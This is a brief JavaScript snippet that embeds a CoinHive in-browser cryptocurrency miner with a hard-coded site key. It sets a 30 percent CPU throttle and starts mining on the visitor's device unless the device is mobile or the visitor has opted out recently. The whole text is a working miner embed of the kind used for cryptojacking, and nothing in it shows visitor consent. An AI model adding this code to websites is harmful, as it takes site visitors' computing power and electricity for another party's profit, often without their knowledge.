var miner = new CoinHive.Anonymous('0bzLEBCuaBCh8sVPYZSkyAAh6i2Q3B6T', {
    throttle: 0.3
});
if (!miner.isMobile() && !miner.didOptOut(14400)) {
    miner.start();
}